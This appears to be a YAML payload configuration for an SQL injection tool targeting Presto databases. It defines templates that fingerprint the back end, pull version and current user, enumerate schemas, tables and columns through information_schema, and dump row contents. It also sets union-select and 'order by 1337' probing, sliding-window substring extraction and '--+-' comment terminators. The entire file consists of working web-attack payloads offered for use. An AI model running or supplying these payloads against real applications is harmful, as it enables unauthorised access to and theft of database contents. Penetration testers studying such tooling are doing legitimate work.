vendor: Presto

resource:
 info: |
  select concat(
      'version()', '${enclose_value_sql}',
      'database()', '${enclose_value_sql}',
      current_user,
      '${trail_sql}'
  )

 schema:
  database: |
   select array_join(
       array_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q
           || '${enclose_value_sql}'
           || ''
       ),
       '${separator_cell_sql}'
   )
   || '${trail_sql}' 
   from (
       SELECT table_schema r, '0' q FROM (
           SELECT row_number() over() AS rn, * from (
               select distinct table_schema 
               from information_schema.columns
           )
       )
       ${limit}
   ) x

  table: |
   select array_join(
       array_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q
           || '${enclose_value_sql}'
           || ''
       ),'${separator_cell_sql}'
   )
   || '${trail_sql}' 
   from (
       SELECT table_name r, '0' q FROM (
           SELECT row_number() over() AS rn, * from (
               select distinct table_name 
               from information_schema.columns 
               where table_schema = '${database}'
           )
       )
       ${limit}
   ) x   

  column: |
   select array_join(
       array_agg(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q
           || '${enclose_value_sql}'
           || ''
       ),
       '${separator_cell_sql}'
   ) 
   || '${trail_sql}' 
   from (
       SELECT column_name r, '0' q FROM (
           SELECT row_number() over() AS rn, * from (
               select distinct column_name 
               from information_schema.columns
               where table_schema = '${database}'
               and table_name = '${table}' 
           )
       ) 
       ${limit}
   ) x   

  row:
   query: |
    select array_join(
        array_agg(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || q
            || '${enclose_value_sql}'
            || ''
        ),
        '${separator_cell_sql}'
    ) 
    || '${trail_sql}' 
    from (
        select r, cast(count(*) as varchar) q from (
            SELECT row_number() over() AS rn, * from (
                select distinct ${fields} r from ${database}.${table}
            )
        )
        ${limit}
        group by r
    ) x    
   fields:
    field: trim(coalesce(${field.value}, ''))
    concat: "||'%7f'||"

strategy:
 configuration:
  slidingWindow: |
   (
       select concat(
           '${lead}',
           substr(
               (${injection}),
               ${window.char},
               ${capacity}
           )
       )
   )
  limit: WHERE rn BETWEEN ${limit.value}%2b1 AND 65536
  failsafe: cast(1337${indice}7330%2b1 as varchar)
  calibrator: array_join(repeat('${calibrator_sql}', 10000),'')
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - presto
   orderByErrorMessage:
#    Collision with postgres
#    - ORDER BY position 1337 is not in select list
    - Collision postgres ORDER BY position 1337 is not in select list

 union:
  indices: union select ${indices}
  capacity: |
   (
       select 
           '${lead}'
           || '${indice}'
           || ${calibrator}
   )
  orderBy: order by 1337